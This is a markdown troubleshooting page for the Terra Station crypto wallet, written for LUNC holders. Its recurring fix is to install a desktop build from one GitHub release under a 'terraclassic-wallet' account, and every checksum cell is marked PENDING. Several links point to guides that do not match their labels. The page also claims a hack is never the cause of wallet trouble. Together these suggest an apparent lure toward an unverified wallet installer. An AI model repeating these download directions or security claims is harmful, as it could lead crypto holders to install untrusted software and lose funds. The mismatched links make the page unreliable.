![Terra Station Wallet](assets/banner-article.png)

# Terra Station Not Working: Fixes for LUNC Holders

<p align="center"><a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-5392F7?style=for-the-badge&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Download for Windows"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-5392F7?style=for-the-badge&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="Download for macOS"></a> <a href="https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-5392F7?style=for-the-badge&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-5392F7?style=flat-square&labelColor=101A42&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=E2EAFB" alt="Windows"> | Windows 10 (1909) or later, 64-bit | `PENDING` |
| <img src="https://img.shields.io/badge/platform-macOS-5392F7?style=flat-square&labelColor=101A42&logo=apple&logoColor=E2EAFB" alt="macOS"> | macOS 12 or later | `PENDING` |
| <img src="https://img.shields.io/badge/platform-Linux-5392F7?style=flat-square&labelColor=101A42&logo=linux&logoColor=E2EAFB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | `PENDING` |

</div>

Every installer and checksum is published on the [Terra Station Wallet release page](https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13); a cell marked PENDING is not published yet, and this page does not invent one.

> **Only download from this GitHub release page.** An installer offered anywhere else, however official it looks, is not a file this project published.

Start by finding out which of three things is broken, because the fixes do not overlap: the app does not open, the app opens but the balance never loads, or the balance is right and a transaction fails. Each one has a short cause list, and none of them means your LUNC is at risk - the chain keeps the balance, and the wallet is only the window.

## Narrow it down with three questions

| Question | If yes | If no |
|---|---|---|
| Does the app window open at all? | Go to "it will not open" below | Go to "it opens but shows nothing" |
| Does the balance appear within a minute? | Go to the transaction section | Check chain and account |
| Does a send or claim fail with an error? | Read the error table | The wallet is working |

Answer these before reinstalling anything. A reinstall fixes exactly one of the three cases, and doing it first throws away the evidence that tells you which case you are in.

## It will not open

An app that stops launching after an update is almost always a damaged install rather than a damaged wallet. Neither the balance nor the keys depend on the installation surviving: keys live in the app's data, and the balance lives on Terra Classic.

1. Close the app completely, including any tray or background process.
2. Install the current release from the release page, over the existing installation rather than beside it.
3. If it still fails, uninstall and install the current release cleanly, then open it and confirm your wallets and balances are still listed.

If the wallets are gone after a clean install, the data was removed with the uninstall - that is the moment the phrase matters, and https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-too-many-requests.md is the route back. *Wallet Won't Open After an Update* goes further into per-platform launch failures.

## It opens but the balance never loads

A wallet that opens with an empty account is usually pointed at the wrong chain, or holding a different account than the one you expected. Compare the receiving address with the address you used before: if it matches, the chain setting is the problem; if it differs, the account is.

*Imported Wallet Shows Zero LUNC: Causes and Fixes* works through both, and *Account Not Loading in Terra Station Wallet* covers the narrow case where the app is still fetching rather than showing a settled empty state.

A first load after a fresh install is the slowest the app will ever be: it has no cached history, so it walks the account's transactions from scratch. Give that first read a few minutes on a slower machine before treating an empty screen as a wrong-wallet answer, and compare the receiving address with the one on an old exchange withdrawal while you wait. If the address is right and the balance stays empty after that, the issue is the chain setting rather than the app's patience.

## It sends, but the transaction fails

Read the message rather than the screen. Terra Classic returns a handful of recurring errors, and each one has a different cause:

| Message or symptom | Cause | What to do |
|---|---|---|
| Insufficient fees | No liquid LUNC for the network fee | Leave a small unstaked balance; see https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-error-502.md |
| 502 or bad gateway | The node could not complete the request | Retry once, then see https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-error-502.md |
| Too many requests | Rate limiting after rapid retries | Wait, then retry once; see https://github.com/terraclassic-wallet/terra-classic-wallet-guides/blob/main/terra-station-too-many-requests.md |
| Fee estimation failed | The app could not compute a fee for the operation | Update to the current release and retry |
| Cannot read properties of undefined | A display fault in the app, not a balance fault | Update to the current release |
| Transaction pending for minutes | Broadcast accepted, confirmation slow | Check the explorer before re-sending |

The last two rows are the ones people misread as lost funds. A JavaScript error string is the app failing to render a value; it says nothing about the chain, and the balance is still there when the app is on the current release.

## When the answer is simply the current release

Most of these reports end here: the fix is the current release (https://github.com/terraclassic-wallet/terra-station-wallet/releases/tag/v2.5.13), installed over the existing app, before anything else is changed.

Most "not working" reports end in the same place: an older build meeting a chain that has moved on, or a build installed from somewhere other than the release page. The current release is the fix, and installing it is not a workaround - it is the supported state of the app.

Two habits make this cheap: take the build from the release page rather than whatever a search returns, and confirm the file before running it. A build that fails the https://github.com/terraclassic-wallet/terra-station-wallet-installation/blob/main/check-terra-station-download-checksum.md comparison is not this wallet, and troubleshooting cannot make it behave like one.

## What is never the cause

- **A lost balance.** The chain holds the balance at your address; an app failure cannot delete it.
- **A hack.** Keys never leave your machine, so there is nothing remote to break into; a broken screen proves only that the screen is broken.
- **A ban or a closed account.** There is no account behind a self-custody wallet, so there is nothing to lock and no one who could lock it.
- **A missing update you must request.** Updates are downloads, not permissions.

## Questions people ask

### My wallet shows an error and I cannot see my balance. Is my LUNC gone?

No. The error is in the display; the balance sits at your address on Terra Classic. Check the address on an explorer, install the current release, and the wallet will read the same balance the explorer shows.

### Why does it work one day and fail the next?

Chain-side conditions change hourly - node load, fee estimates, network upgrades. An app that failed during a busy period usually works on a retry minutes later, which is why the error message matters more than the timing.

### Should I reinstall first?

No. Reinstalling destroys the evidence that identifies the failure, and if the uninstall clears app data it also costs you the wallet unless the phrase is safe. Identify the case first, then install.

### Do I need to re-import my phrase to fix this?

Only if the wallets disappear, which happens when an uninstall removes app data. For launch, loading and transaction failures the phrase is never needed and should not be typed into anything.
